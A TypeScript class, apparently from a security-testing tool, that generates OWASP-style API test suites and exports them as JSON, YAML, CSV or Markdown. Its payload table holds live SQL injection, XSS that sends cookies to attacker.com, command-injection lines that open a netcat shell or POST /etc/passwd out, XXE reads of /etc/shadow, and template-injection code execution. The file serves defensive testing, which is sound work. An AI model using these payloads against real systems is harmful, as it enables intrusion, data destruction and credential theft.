import { ApiClient, HttpMethod, RequestOptions } from '../api/api-client';
import { SecurityTestCase, SecurityTestSuite } from './security-testing-agent';
import { SecurityVulnerabilityType } from './security-testing-agent';

export interface AttackVector {
  name: string;
  description: string;
  category: string;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  payloads: string[];
  testCases: SecurityTestCase[];
}

export interface SecurityTestSuiteConfig {
  endpoints: string[];
  methods: HttpMethod[];
  attackVectors: SecurityVulnerabilityType[];
  includeAuthTests: boolean;
  includeInjectionTests: boolean;
  includeRateLimitTests: boolean;
  includeDataExposureTests: boolean;
  includeComplianceTests: boolean;
  customPayloads?: Record<string, string[]>;
  testDepth: 'BASIC' | 'STANDARD' | 'COMPREHENSIVE' | 'PENETRATION';
}

export interface GeneratedTestSuite {
  name: string;
  description: string;
  testSuites: SecurityTestSuite[];
  attackVectors: AttackVector[];
  totalTests: number;
  estimatedDuration: string;
  riskLevel: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
}

export class SecurityTestSuiteGenerator {
  private apiClient: ApiClient;

  // Comprehensive attack payloads by category
  private readonly attackPayloads = {
    sqlInjection: {
      basic: [
        "1'; DROP TABLE users; --",
        "1' OR '1'='1",
        "1' UNION SELECT * FROM users --",
        "1'; INSERT INTO users VALUES ('hacker', 'password'); --"
      ],
      advanced: [
        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
        "1' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
        "1'; WAITFOR DELAY '00:00:05' --",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --"
      ],
      timeBased: [
        "1'; WAITFOR DELAY '00:00:05' --",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --"
      ],
      booleanBased: [
        "1' AND 1=1 --",
        "1' AND 1=2 --",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --",
        "1' AND (SELECT COUNT(*) FROM users) = 0 --"
      ]
    },
    
    xss: {
      basic: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')></iframe>"
      ],
      advanced: [
        "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
        "<img src=x onerror=\"fetch('http://attacker.com/steal',{method:'POST',body:document.cookie})\">",
        "<svg onload=\"fetch('http://attacker.com/steal',{method:'POST',body:document.cookie})\">"
      ],
      domBased: [
        "#<script>alert('XSS')</script>",
        "?param=<script>alert('XSS')</script>",
        "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>"
      ],
      filterBypass: [
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>alert(/XSS/)</script>",
        "<script>alert`XSS`</script>"
      ]
    },
    
    commandInjection: {
      basic: [
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "`id`",
        "$(cat /etc/passwd)"
      ],
      advanced: [
        "; cat /etc/passwd | grep root",
        "| nc -l -p 4444 -e /bin/sh",
        "&& curl http://attacker.com/steal",
        "`wget http://attacker.com/steal`",
        "$(curl -X POST -d @/etc/passwd http://attacker.com/steal)"
      ],
      windows: [
        "& dir",
        "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "&& net user",
        "`ipconfig`",
        "$(systeminfo)"
      ]
    },
    
    pathTraversal: {
      basic: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
      ],
      advanced: [
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
        "..%255c..%255c..%255cetc%255cpasswd"
      ],
      nullByte: [
        "../../../etc/passwd%00",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00"
      ],
      doubleEncoding: [
        "..%252e%252e%252f..%252e%252e%252f..%252e%252e%252fetc%252fpasswd"
      ]
    },
    
    xmlExternalEntity: {
      basic: [
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://attacker.com/steal'>]><root>&xxe;</root>"
      ],
      advanced: [
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>]><root>&xxe;</root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///proc/version'>]><root>&xxe;</root>"
      ],
      parameterEntities: [
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]><root></root>",
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % xxe SYSTEM 'http://attacker.com/steal'> %xxe;]><root></root>"
      ]
    },
    
    ldapInjection: {
      basic: [
        "*)(uid=*))(|(uid=*",
        "*)(|(password=*))",
        "*)(|(objectClass=*))",
        "*)(|(cn=*))"
      ],
      advanced: [
        "*)(|(userPassword=*))",
        "*)(|(mail=*))",
        "*)(|(telephoneNumber=*))",
        "*)(|(description=*))"
      ]
    },
    
    nosqlInjection: {
      mongodb: [
        "{\"$where\": \"this.username == 'admin'\"}",
        "{\"$where\": \"this.password == 'password'\"}",
        "{\"$ne\": null}",
        "{\"$gt\": \"\"}"
      ],
      couchdb: [
        "{\"selector\": {\"username\": {\"$eq\": \"admin\"}}}",
        "{\"selector\": {\"password\": {\"$eq\": \"password\"}}}"
      ]
    },
    
    templateInjection: {
      jinja2: [
        "{{7*7}}",
        "{{config}}",
        "{{request}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"
      ],
      twig: [
        "{{7*7}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
      ],
      freemarker: [
        "${7*7}",
        "${'freemarker.template.utility.Execute'?new()('id')}"
      ],
      velocity: [
        "#set($x=$e.getClass().forName('java.lang.Runtime').getRuntime().exec('id'))"
      ]
    }
  };

  constructor(apiClient: ApiClient) {
    this.apiClient = apiClient;
  }

  /**
   * Generate comprehensive security test suite
   */
  generateSecurityTestSuite(config: SecurityTestSuiteConfig): GeneratedTestSuite {
    console.log(`🔧 Generating security test suite...`);
    console.log(`📋 Endpoints: ${config.endpoints.length}`);
    console.log(`🔧 Methods: ${config.methods.join(', ')}`);
    console.log(`🎯 Attack Vectors: ${config.attackVectors.length}`);
    console.log(`📊 Test Depth: ${config.testDepth}`);

    const testSuites: SecurityTestSuite[] = [];
    const attackVectors: AttackVector[] = [];
    let totalTests = 0;

    // Generate test suites for each endpoint
    for (const endpoint of config.endpoints) {
      const suite = this.generateEndpointTestSuite(endpoint, config);
      testSuites.push(suite);
      totalTests += suite.tests.length;
    }

    // Generate attack vectors
    for (const vectorType of config.attackVectors) {
      const vector = this.generateAttackVector(vectorType, config);
      attackVectors.push(vector);
    }

    const estimatedDuration = this.estimateTestDuration(totalTests, config.testDepth);
    const riskLevel = this.assessRiskLevel(config.attackVectors, config.testDepth);

    return {
      name: `Security Test Suite - ${config.endpoints.join(', ')}`,
      description: `Comprehensive security testing suite for ${config.endpoints.length} endpoints`,
      testSuites,
      attackVectors,
      totalTests,
      estimatedDuration,
      riskLevel
    };
  }

  /**
   * Generate test suite for specific endpoint
   */
  private generateEndpointTestSuite(endpoint: string, config: SecurityTestSuiteConfig): SecurityTestSuite {
    const tests: SecurityTestCase[] = [];

    for (const method of config.methods) {
      // Authentication tests
      if (config.includeAuthTests) {
        tests.push(...this.generateAuthenticationTests(endpoint, method));
      }

      // Injection tests
      if (config.includeInjectionTests) {
        tests.push(...this.generateInjectionTests(endpoint, method, config));
      }

      // Rate limiting tests
      if (config.includeRateLimitTests) {
        tests.push(...this.generateRateLimitTests(endpoint, method));
      }

      // Data exposure tests
      if (config.includeDataExposureTests) {
        tests.push(...this.generateDataExposureTests(endpoint, method));
      }

      // Compliance tests
      if (config.includeComplianceTests) {
        tests.push(...this.generateComplianceTests(endpoint, method));
      }
    }

    return {
      name: `Security Tests - ${endpoint}`,
      description: `Security testing for ${endpoint} endpoint`,
      tests,
      complianceFramework: 'OWASP'
    };
  }

  /**
   * Generate authentication tests
   */
  private generateAuthenticationTests(endpoint: string, method: HttpMethod): SecurityTestCase[] {
    const tests: SecurityTestCase[] = [];

    // No authentication test
    tests.push({
      name: `Authentication Bypass - No Token`,
      description: `Test if ${endpoint} is accessible without authentication`,
      method,
      path: endpoint,
      expectedStatus: [401, 403],
      vulnerabilityType: 'AUTH_BYPASS',
      severity: 'HIGH',
      complianceCheck: true
    });

    // Invalid token test
    tests.push({
      name: `Authentication Bypass - Invalid Token`,
      description: `Test if ${endpoint} accepts invalid authentication tokens`,
      method,
      path: endpoint,
      options: {
        headers: { 'Authorization': 'Bearer invalid-token-12345' }
      },
      expectedStatus: [401, 403],
      vulnerabilityType: 'AUTH_BYPASS',
      severity: 'HIGH',
      complianceCheck: true
    });

    // Expired token test
    tests.push({
      name: `Authentication Bypass - Expired Token`,
      description: `Test if ${endpoint} accepts expired authentication tokens`,
      method,
      path: endpoint,
      options: {
        headers: { 'Authorization': 'Bearer expired-token' }
      },
      expectedStatus: [401, 403],
      vulnerabilityType: 'AUTH_BYPASS',
      severity: 'HIGH',
      complianceCheck: true
    });

    // Malformed token test
    tests.push({
      name: `Authentication Bypass - Malformed Token`,
      description: `Test if ${endpoint} accepts malformed authentication tokens`,
      method,
      path: endpoint,
      options: {
        headers: { 'Authorization': 'InvalidFormat token' }
      },
      expectedStatus: [401, 403],
      vulnerabilityType: 'AUTH_BYPASS',
      severity: 'HIGH',
      complianceCheck: true
    });

    return tests;
  }

  /**
   * Generate injection tests
   */
  private generateInjectionTests(endpoint: string, method: HttpMethod, config: SecurityTestSuiteConfig): SecurityTestCase[] {
    const tests: SecurityTestCase[] = [];

    // SQL Injection tests
    if (config.attackVectors.includes('SQL_INJECTION')) {
      const sqlPayloads = this.getPayloadsForDepth('sqlInjection', config.testDepth);
      for (const payload of sqlPayloads) {
        if (method === 'GET') {
          tests.push({
            name: `SQL Injection - Path Parameter (${payload.substring(0, 20)}...)`,
            description: `Test SQL injection in path parameter for ${endpoint}`,
            method,
            path: `${endpoint}/${payload}`,
            expectedStatus: [400, 404, 403, 500],
            vulnerabilityType: 'SQL_INJECTION',
            payload,
            severity: 'HIGH',
            complianceCheck: true
          });
        } else {
          tests.push({
            name: `SQL Injection - Request Body (${payload.substring(0, 20)}...)`,
            description: `Test SQL injection in request body for ${endpoint}`,
            method,
            path: endpoint,
            options: {
              data: { id: payload, name: payload, query: payload },
              headers: { 'Content-Type': 'application/json' }
            },
            expectedStatus: [400, 422, 500],
            vulnerabilityType: 'SQL_INJECTION',
            payload,
            severity: 'HIGH',
            complianceCheck: true
          });
        }
      }
    }

    // XSS tests
    if (config.attackVectors.includes('XSS')) {
      const xssPayloads = this.getPayloadsForDepth('xss', config.testDepth);
      for (const payload of xssPayloads) {
        if (method === 'POST' || method === 'PUT') {
          tests.push({
            name: `XSS - Request Body (${payload.substring(0, 20)}...)`,
            description: `Test XSS in request body for ${endpoint}`,
            method,
            path: endpoint,
            options: {
              data: { 
                name: payload, 
                description: payload,
                title: payload,
                content: payload
              },
              headers: { 'Content-Type': 'application/json' }
            },
            expectedStatus: [400, 422],
            vulnerabilityType: 'XSS',
            payload,
            severity: 'MEDIUM',
            complianceCheck: true
          });
        }
      }
    }

    // Command Injection tests
    if (config.attackVectors.includes('INJECTION')) {
      const cmdPayloads = this.getPayloadsForDepth('commandInjection', config.testDepth);
      for (const payload of cmdPayloads) {
        tests.push({
          name: `Command Injection - Request Body (${payload.substring(0, 20)}...)`,
          description: `Test command injection in request body for ${endpoint}`,
          method,
          path: endpoint,
          options: {
            data: { 
              command: payload,
              query: payload,
              search: payload,
              input: payload
            },
            headers: { 'Content-Type': 'application/json' }
          },
          expectedStatus: [400, 422, 500],
          vulnerabilityType: 'INJECTION',
          payload,
          severity: 'HIGH',
          complianceCheck: true
        });
      }
    }

    // Path Traversal tests
    if (config.attackVectors.includes('INJECTION')) {
      const pathPayloads = this.getPayloadsForDepth('pathTraversal', config.testDepth);
      for (const payload of pathPayloads) {
        tests.push({
          name: `Path Traversal - Path Parameter (${payload.substring(0, 20)}...)`,
          description: `Test path traversal in path parameter for ${endpoint}`,
          method: 'GET',
          path: `${endpoint}/${payload}`,
          expectedStatus: [400, 404, 403],
          vulnerabilityType: 'INJECTION',
          payload,
          severity: 'HIGH',
          complianceCheck: true
        });
      }
    }

    // XXE tests
    if (config.attackVectors.includes('XML_EXTERNAL_ENTITY')) {
      const xxePayloads = this.getPayloadsForDepth('xmlExternalEntity', config.testDepth);
      for (const payload of xxePayloads) {
        tests.push({
          name: `XXE - XML Payload (${payload.substring(0, 20)}...)`,
          description: `Test XXE in XML payload for ${endpoint}`,
          method,
          path: endpoint,
          options: {
            data: payload,
            headers: { 'Content-Type': 'application/xml' }
          },
          expectedStatus: [400, 422, 500],
          vulnerabilityType: 'XML_EXTERNAL_ENTITY',
          payload,
          severity: 'HIGH',
          complianceCheck: true
        });
      }
    }

    return tests;
  }

  /**
   * Generate rate limiting tests
   */
  private generateRateLimitTests(endpoint: string, method: HttpMethod): SecurityTestCase[] {
    const tests: SecurityTestCase[] = [];

    // Rapid requests test
    tests.push({
      name: `Rate Limiting - Rapid Requests`,
      description: `Test rate limiting for ${endpoint}`,
      method,
      path: endpoint,
      expectedStatus: [200, 429],
      vulnerabilityType: 'RATE_LIMIT_BYPASS',
      severity: 'MEDIUM',
      complianceCheck: true
    });

    // Burst requests test
    tests.push({
      name: `Rate Limiting - Burst Requests`,
      description: `Test burst rate limiting for ${endpoint}`,
      method,
      path: endpoint,
      expectedStatus: [200, 429],
      vulnerabilityType: 'RATE_LIMIT_BYPASS',
      severity: 'MEDIUM',
      complianceCheck: true
    });

    // Concurrent requests test
    tests.push({
      name: `Rate Limiting - Concurrent Requests`,
      description: `Test concurrent request handling for ${endpoint}`,
      method,
      path: endpoint,
      expectedStatus: [200, 429, 503],
      vulnerabilityType: 'RATE_LIMIT_BYPASS',
      severity: 'MEDIUM',
      complianceCheck: true
    });

    return tests;
  }

  /**
   * Generate data exposure tests
   */
  private generateDataExposureTests(endpoint: string, method: HttpMethod): SecurityTestCase[] {
    const tests: SecurityTestCase[] = [];

    // Sensitive data exposure test
    tests.push({
      name: `Data Exposure - Sensitive Data`,
      description: `Test for sensitive data exposure in ${endpoint}`,
      method,
      path: endpoint,
      expectedStatus: [200, 201],
      vulnerabilityType: 'DATA_EXPOSURE',
      severity: 'HIGH',
      complianceCheck: true
    });

    // Information disclosure test
    tests.push({
      name: `Information Disclosure - Error Messages`,
      description: `Test for information disclosure in error messages for ${endpoint}`,
      method,
      path: `${endpoint}/nonexistent`,
      expectedStatus: [400, 404, 500],
      vulnerabilityType: 'INFORMATION_DISCLOSURE',
      severity: 'MEDIUM',
      complianceCheck: true
    });

    return tests;
  }

  /**
   * Generate compliance tests
   */
  private generateComplianceTests(endpoint: string, method: HttpMethod): SecurityTestCase[] {
    const tests: SecurityTestCase[] = [];

    // HTTPS enforcement test
    tests.push({
      name: `HTTPS Enforcement`,
      description: `Test HTTPS enforcement for ${endpoint}`,
      method,
      path: endpoint,
      expectedStatus: [200, 301, 302],
      vulnerabilityType: 'SECURITY_MISCONFIGURATION',
      severity: 'MEDIUM',
      complianceCheck: true
    });

    // Security headers test
    tests.push({
      name: `Security Headers`,
      description: `Test security headers for ${endpoint}`,
      method,
      path: endpoint,
      expectedStatus: [200],
      vulnerabilityType: 'SECURITY_MISCONFIGURATION',
      severity: 'MEDIUM',
      complianceCheck: true
    });

    return tests;
  }

  /**
   * Generate attack vector
   */
  private generateAttackVector(vectorType: SecurityVulnerabilityType, config: SecurityTestSuiteConfig): AttackVector {
    const payloads = this.getPayloadsForVectorType(vectorType, config.testDepth);
    
    return {
      name: vectorType,
      description: this.getVectorDescription(vectorType),
      category: this.getVectorCategory(vectorType),
      severity: this.getVectorSeverity(vectorType),
      payloads,
      testCases: [] // Will be populated by test suite generation
    };
  }

  /**
   * Get payloads for specific depth
   */
  private getPayloadsForDepth(category: string, depth: string): string[] {
    const categoryPayloads = this.attackPayloads[category as keyof typeof this.attackPayloads];
    if (!categoryPayloads) return [];

    // Handle different payload structures
    const getBasicPayloads = (payloads: any): string[] => {
      if (payloads.basic) return payloads.basic;
      if (payloads.mongodb) return payloads.mongodb;
      if (payloads.jinja2) return payloads.jinja2;
      return [];
    };

    const getAdvancedPayloads = (payloads: any): string[] => {
      if (payloads.advanced) return payloads.advanced;
      if (payloads.couchdb) return payloads.couchdb;
      if (payloads.twig) return payloads.twig;
      return [];
    };

    switch (depth) {
      case 'BASIC':
        return getBasicPayloads(categoryPayloads);
      case 'STANDARD':
        return [...getBasicPayloads(categoryPayloads), ...getAdvancedPayloads(categoryPayloads)];
      case 'COMPREHENSIVE':
        return Object.values(categoryPayloads).flat();
      case 'PENETRATION':
        return Object.values(categoryPayloads).flat();
      default:
        return getBasicPayloads(categoryPayloads);
    }
  }

  /**
   * Get payloads for vector type
   */
  private getPayloadsForVectorType(vectorType: SecurityVulnerabilityType, depth: string): string[] {
    switch (vectorType) {
      case 'SQL_INJECTION':
        return this.getPayloadsForDepth('sqlInjection', depth);
      case 'XSS':
        return this.getPayloadsForDepth('xss', depth);
      case 'INJECTION':
        return [
          ...this.getPayloadsForDepth('commandInjection', depth),
          ...this.getPayloadsForDepth('pathTraversal', depth)
        ];
      case 'XML_EXTERNAL_ENTITY':
        return this.getPayloadsForDepth('xmlExternalEntity', depth);
      default:
        return [];
    }
  }

  /**
   * Get vector description
   */
  private getVectorDescription(vectorType: SecurityVulnerabilityType): string {
    const descriptions: Record<SecurityVulnerabilityType, string> = {
      'SQL_INJECTION': 'SQL injection attacks attempt to manipulate database queries through malicious input',
      'XSS': 'Cross-site scripting attacks inject malicious scripts into web applications',
      'INJECTION': 'Command injection attacks execute arbitrary commands on the server',
      'XML_EXTERNAL_ENTITY': 'XXE attacks exploit XML parsers to access local files or perform SSRF',
      'AUTH_BYPASS': 'Authentication bypass attacks attempt to circumvent authentication mechanisms',
      'RATE_LIMIT_BYPASS': 'Rate limiting bypass attacks attempt to exceed request rate limits',
      'DATA_EXPOSURE': 'Data exposure attacks attempt to access sensitive information',
      'INFORMATION_DISCLOSURE': 'Information disclosure attacks attempt to extract system information',
      'CSRF': 'Cross-site request forgery attacks trick users into performing unwanted actions',
      'BROKEN_AUTHENTICATION': 'Broken authentication vulnerabilities in login and session management',
      'SENSITIVE_DATA_EXPOSURE': 'Sensitive data exposure vulnerabilities leak confidential information',
      'BROKEN_ACCESS_CONTROL': 'Broken access control allows unauthorized access to resources',
      'SECURITY_MISCONFIGURATION': 'Security misconfiguration vulnerabilities due to improper settings',
      'CROSS_SITE_SCRIPTING': 'Cross-site scripting vulnerabilities allow script injection',
      'INSECURE_DESERIALIZATION': 'Insecure deserialization vulnerabilities allow code execution',
      'KNOWN_VULNERABILITIES': 'Known vulnerabilities in components and dependencies',
      'INSUFFICIENT_LOGGING': 'Insufficient logging and monitoring vulnerabilities',
      'WEAK_CRYPTOGRAPHY': 'Weak cryptography vulnerabilities in encryption and hashing'
    };
    
    return descriptions[vectorType] || 'Unknown attack vector';
  }

  /**
   * Get vector category
   */
  private getVectorCategory(vectorType: SecurityVulnerabilityType): string {
    const categories: Record<SecurityVulnerabilityType, string> = {
      'SQL_INJECTION': 'Injection',
      'XSS': 'Injection',
      'INJECTION': 'Injection',
      'XML_EXTERNAL_ENTITY': 'Injection',
      'AUTH_BYPASS': 'Authentication',
      'RATE_LIMIT_BYPASS': 'Availability',
      'DATA_EXPOSURE': 'Data Protection',
      'INFORMATION_DISCLOSURE': 'Information Security',
      'CSRF': 'Authentication',
      'BROKEN_AUTHENTICATION': 'Authentication',
      'SENSITIVE_DATA_EXPOSURE': 'Data Protection',
      'BROKEN_ACCESS_CONTROL': 'Authorization',
      'SECURITY_MISCONFIGURATION': 'Configuration',
      'CROSS_SITE_SCRIPTING': 'Injection',
      'INSECURE_DESERIALIZATION': 'Injection',
      'KNOWN_VULNERABILITIES': 'Dependencies',
      'INSUFFICIENT_LOGGING': 'Monitoring',
      'WEAK_CRYPTOGRAPHY': 'Cryptography'
    };
    
    return categories[vectorType] || 'Other';
  }

  /**
   * Get vector severity
   */
  private getVectorSeverity(vectorType: SecurityVulnerabilityType): 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL' {
    const severities = {
      'SQL_INJECTION': 'HIGH',
      'XSS': 'MEDIUM',
      'INJECTION': 'HIGH',
      'XML_EXTERNAL_ENTITY': 'HIGH',
      'AUTH_BYPASS': 'HIGH',
      'RATE_LIMIT_BYPASS': 'MEDIUM',
      'DATA_EXPOSURE': 'HIGH',
      'INFORMATION_DISCLOSURE': 'MEDIUM'
    };
    
    return severities[vectorType] || 'MEDIUM';
  }

  /**
   * Estimate test duration
   */
  private estimateTestDuration(totalTests: number, depth: string): string {
    const baseTimePerTest = 2; // seconds
    const depthMultiplier = {
      'BASIC': 1,
      'STANDARD': 1.5,
      'COMPREHENSIVE': 2,
      'PENETRATION': 3
    };
    
    const multiplier = depthMultiplier[depth as keyof typeof depthMultiplier] || 1;
    const totalSeconds = totalTests * baseTimePerTest * multiplier;
    
    if (totalSeconds < 60) {
      return `${totalSeconds} seconds`;
    } else if (totalSeconds < 3600) {
      return `${Math.round(totalSeconds / 60)} minutes`;
    } else {
      return `${Math.round(totalSeconds / 3600)} hours`;
    }
  }

  /**
   * Assess risk level
   */
  private assessRiskLevel(attackVectors: SecurityVulnerabilityType[], depth: string): 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL' {
    const highRiskVectors = ['SQL_INJECTION', 'INJECTION', 'XML_EXTERNAL_ENTITY', 'AUTH_BYPASS'];
    const hasHighRisk = attackVectors.some(v => highRiskVectors.includes(v));
    
    if (depth === 'PENETRATION' && hasHighRisk) {
      return 'CRITICAL';
    } else if (depth === 'COMPREHENSIVE' && hasHighRisk) {
      return 'HIGH';
    } else if (hasHighRisk) {
      return 'MEDIUM';
    } else {
      return 'LOW';
    }
  }

  /**
   * Export test suite to various formats
   */
  exportTestSuite(testSuite: GeneratedTestSuite, format: 'JSON' | 'YAML' | 'CSV' | 'MARKDOWN'): string {
    switch (format) {
      case 'JSON':
        return JSON.stringify(testSuite, null, 2);
      case 'YAML':
        return this.exportToYaml(testSuite);
      case 'CSV':
        return this.exportToCsv(testSuite);
      case 'MARKDOWN':
        return this.exportToMarkdown(testSuite);
      default:
        throw new Error(`Unsupported format: ${format}`);
    }
  }

  /**
   * Export to YAML format
   */
  private exportToYaml(testSuite: GeneratedTestSuite): string {
    // Simple YAML export - in production, use a proper YAML library
    let yaml = `name: "${testSuite.name}"\n`;
    yaml += `description: "${testSuite.description}"\n`;
    yaml += `totalTests: ${testSuite.totalTests}\n`;
    yaml += `estimatedDuration: "${testSuite.estimatedDuration}"\n`;
    yaml += `riskLevel: "${testSuite.riskLevel}"\n\n`;
    
    yaml += `testSuites:\n`;
    for (const suite of testSuite.testSuites) {
      yaml += `  - name: "${suite.name}"\n`;
      yaml += `    description: "${suite.description}"\n`;
      yaml += `    tests: ${suite.tests.length}\n`;
    }
    
    return yaml;
  }

  /**
   * Export to CSV format
   */
  private exportToCsv(testSuite: GeneratedTestSuite): string {
    let csv = 'Test Suite,Test Name,Method,Path,Vulnerability Type,Severity,Expected Status\n';
    
    for (const suite of testSuite.testSuites) {
      for (const test of suite.tests) {
        csv += `"${suite.name}","${test.name}","${test.method}","${test.path}","${test.vulnerabilityType}","${test.severity}","${test.expectedStatus}"\n`;
      }
    }
    
    return csv;
  }

  /**
   * Export to Markdown format
   */
  private exportToMarkdown(testSuite: GeneratedTestSuite): string {
    let markdown = `# ${testSuite.name}\n\n`;
    markdown += `**Description:** ${testSuite.description}\n`;
    markdown += `**Total Tests:** ${testSuite.totalTests}\n`;
    markdown += `**Estimated Duration:** ${testSuite.estimatedDuration}\n`;
    markdown += `**Risk Level:** ${testSuite.riskLevel}\n\n`;
    
    markdown += `## Test Suites\n\n`;
    for (const suite of testSuite.testSuites) {
      markdown += `### ${suite.name}\n`;
      markdown += `${suite.description}\n\n`;
      
      markdown += `| Test Name | Method | Path | Vulnerability Type | Severity | Expected Status |\n`;
      markdown += `|-----------|--------|------|-------------------|----------|----------------|\n`;
      
      for (const test of suite.tests) {
        markdown += `| ${test.name} | ${test.method} | ${test.path} | ${test.vulnerabilityType} | ${test.severity} | ${test.expectedStatus} |\n`;
      }
      markdown += `\n`;
    }
    
    markdown += `## Attack Vectors\n\n`;
    for (const vector of testSuite.attackVectors) {
      markdown += `### ${vector.name}\n`;
      markdown += `- **Category:** ${vector.category}\n`;
      markdown += `- **Severity:** ${vector.severity}\n`;
      markdown += `- **Description:** ${vector.description}\n`;
      markdown += `- **Payloads:** ${vector.payloads.length}\n\n`;
    }
    
    return markdown;
  }

  /**
   * Get all available attack vectors
   */
  getAvailableAttackVectors(): SecurityVulnerabilityType[] {
    return [
      'SQL_INJECTION',
      'XSS',
      'INJECTION',
      'XML_EXTERNAL_ENTITY',
      'AUTH_BYPASS',
      'RATE_LIMIT_BYPASS',
      'DATA_EXPOSURE',
      'INFORMATION_DISCLOSURE'
    ];
  }

  /**
   * Get attack payloads for specific vector
   */
  getAttackPayloads(vectorType: SecurityVulnerabilityType, depth: string = 'BASIC'): string[] {
    return this.getPayloadsForVectorType(vectorType, depth);
  }

  /**
   * Validate test suite configuration
   */
  validateConfiguration(config: SecurityTestSuiteConfig): { valid: boolean; errors: string[] } {
    const errors: string[] = [];

    if (!config.endpoints || config.endpoints.length === 0) {
      errors.push('At least one endpoint must be specified');
    }

    if (!config.methods || config.methods.length === 0) {
      errors.push('At least one HTTP method must be specified');
    }

    if (!config.attackVectors || config.attackVectors.length === 0) {
      errors.push('At least one attack vector must be specified');
    }

    const availableVectors = this.getAvailableAttackVectors();
    const invalidVectors = config.attackVectors.filter(v => !availableVectors.includes(v));
    if (invalidVectors.length > 0) {
      errors.push(`Invalid attack vectors: ${invalidVectors.join(', ')}`);
    }

    return {
      valid: errors.length === 0,
      errors
    };
  }
}

export default SecurityTestSuiteGenerator;
